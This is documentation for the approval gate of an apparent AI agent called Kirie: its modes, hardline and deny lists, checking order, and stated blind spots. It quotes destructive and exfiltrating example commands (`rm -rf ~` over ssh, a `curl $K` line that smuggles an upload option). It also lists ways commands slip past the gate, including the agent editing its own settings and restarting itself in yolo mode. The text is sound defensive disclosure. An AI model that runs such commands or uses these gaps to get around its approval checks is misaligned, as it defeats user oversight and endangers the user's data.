# Approval gates

Kirie checks every tool call (from chats, background tasks, schedules, goals,
webhooks, and every subagent) with one classifier before it runs. You choose
how much it asks with `/approvals` in your DM.

## Modes

- **yolo** (default): nothing is asked. Compared with Kirie before the gates
  existed, these still block in every mode:
  - the **hardline list**: catastrophic, irrecoverable commands only:
    recursive delete of `/`, your home folder, `/Users` or a system root
    (also `find <root> -delete`, and through the macOS aliases
    `/System/Volumes/Data/...` and `/Volumes/Macintosh HD/...`), disk
    formatting and raw device writes, fork bombs, recursive chmod/chown of
    those roots. It also applies to commands sent to another machine or a
    container (`ssh host 'rm -rf ~'`, `kubectl exec`, `docker exec`, the
    docker sandbox shell), and to `Bash`, `Monitor` and `PowerShell` alike;
  - your own **deny list** (`/approvals deny <pattern>`), if you set one
    (empty by default);
  - the **reserved MCP gate**: tools of MCP servers named `cua-driver` or
    `cua-computer-use` are denied unless computer use is armed for your own
    DM. It changes nothing if you have no such server;
  - the **computer-use shell tripwire**, only while `computerUse.enabled` is
    true (off by default): commands that run `cua-driver` or open
    `CuaDriver.app` are denied unless computer use is armed (see
    docs/computer-use-setup.md). Commands that only mention it pass;
  - the **skill write guard** (`learning.skillWriteGuard`, default
    `enforce`), which belongs to self-learning, not to this gate.

  `/approvals hardline off` (or `approvals.hardline: false` in config.yaml)
  turns the hardline list off: the approval gate then blocks nothing in yolo
  except your deny list. The other items above are separate switches.
- **ask**: risky actions wait for your Approve or Deny on a card in your DM.
  - scope **dangerous** (default): only commands that match a dangerous rule,
    sensitive tools, protected paths, and commands Kirie cannot read with
    confidence ask.
  - scope **all**: everything that is not on your allow list asks.

No answer in `approvals.timeoutSeconds` (5 minutes) means deny. Only you can
answer, only in your own DM, only on the card that was sent. Deny + stop also
ends the agent's turn.

Typed codes: `/deny <code>` always works. `/approve <code>` approves directly
only on a channel without buttons; on Telegram it sends the real card again,
with its buttons, and you approve there, so a look-alike text card cannot get
a request approved. Every reply names the request ("Approved K7Q2 (Approve):
Bash: rm -rf build"). Codes are never written to the audit log, and a code is
not reused for a day.

Order of the checks: hardline, deny list, dangerous rules, allow list,
uncertain parse, mode. A command made of several parts gets the strictest
verdict of its parts. Allow patterns never override a dangerous rule or the
hardline list; a dangerous rule can be switched off with
`approvals.disabledRules` in config.yaml.

## Commands

`/approvals` (status), `mode yolo|ask`, `scope dangerous|all`,
`allow <pattern> [--force]`, `deny <pattern>`, `unallow`, `undeny`, `list`,
`rules` (the built-in rule ids, generated from the code), `test <command>`
(dry run, never executes), `log [n]`, `hardline on|off`, `reset`.
Switching to yolo, narrowing the scope, turning the hardline list off, forced
broad allow patterns, `undeny` and `reset` ask you to confirm.

Pattern syntax: a bare glob over one shell command (`git push --force*`,
`kubectl delete *`), `Tool(glob)` for other tools (`Write(~/.ssh/**)`,
`Read(~/dev/**)`; `Edit(...)` covers every file-writing tool), or an MCP tool
name glob (`mcp__github__delete_*`).

## Built-in tools

Every SDK built-in that runs a shell command is checked exactly like `Bash`
(hardline list, deny list, ask rules, allow list, the same card): `Monitor`
(a watched shell command; a WebSocket watch without a command is not a shell
call) and `PowerShell`. PowerShell is not a POSIX shell, so its commands are
also always **uncertain** (they ask in `ask` mode).

Built-ins whose effect the gate cannot read from their input are
**uncertain** (ask in `ask` mode, run in `yolo` as before):

| Tool | Why |
|---|---|
| `Workflow` | runs a script (inline, by name or from a file) that starts subagents |
| `CronCreate`, `ScheduleWakeup` | schedule a prompt that runs later (a durable cron job survives restarts) |
| `RemoteTrigger` | `create`, `update`, `run` and webhook actions start or change remote agents (`list`, `get`, `list_runs`, `get_run_log` are read-only and do not ask) |
| `EnterWorktree` | creates or enters a git worktree and moves the session's working directory |
| `ExitWorktree` with `action: "remove"` | deletes a worktree and its branch |

Subagents (`Agent`) are not asked for: each tool call a subagent makes is
checked on its own.

## Unattended work

Background tasks, scheduled jobs, goals and loop ticks ask you like a chat
does (`approvals.unattended: "ask"`, default) or are denied outright
(`"deny"`). Work started by a webhook never asks: anything that would ask is
denied.

## What the gate does not do

The gate is a careful reader of commands, not a sandbox. It runs as the same
macOS user as Kirie, and pattern detection is best effort. In particular it
cannot see inside:

- scripts the agent writes to disk and then runs (`./script.sh`,
  `bash script.sh`);
- tools with their own command language (`make`, `npm run`, `just`, `git`
  aliases and config, editor commands);
- aliases or shell functions defined in an earlier command.

Commands it cannot read with confidence (inline interpreter code, `eval` or
`bash -c` of computed text, here-documents or substituted scripts fed to a
shell or to `source`, piped input run as code, zsh glob qualifiers and
`always` blocks, more wrappers or nested blocks than the parser follows,
unbalanced quotes, invisible or direction-changing characters, very long
commands, PowerShell, and a network command such as `curl`, `wget` or `scp`
whose arguments come from a variable that could hold options:
`K='-T ~/file'; curl $K https://host`) are treated as **uncertain**: they ask in `ask` mode and
run in `yolo`. Where the text is literal (`bash <(echo '...')`,
`trap '...' EXIT`) it is also read as a command, so the hardline list and
your deny list still see it. For an enforced boundary combine `ask` mode with
the sandbox (`/sandbox`).

What the agent cannot do: there is no tool or HTTP route that approves,
changes the mode or edits the lists (the `approval_status` tool only reads the
mode, scope and pending count), and scheduled or injected text never runs a
command.

What it **can** do, and the residual risk: Kirie's own settings, config and
state files are on the protected-write list, but a protected path only
**asks in `ask` mode**. In **yolo** (the default) a write to a protected path
is allowed and only recorded in the audit log. So in yolo the agent can edit
the runtime settings file (`~/.kirie/state/runtime-settings.json`, where
`/approvals`, `/goal on`, `/loop on`, learning and plugin switches are
stored), `config.yaml` (also through `mcp_servers_add`) and the other state
files, and restart the daemon (`gateway_restart` and killing the process are
not asked in yolo); the edited settings take effect at the next start. Use
`ask` mode (plus the sandbox) if that matters to you. In `ask` mode protected
paths are matched after macOS path aliases, case folding and directory
destinations (`cp x ~/.kirie/`) are resolved.
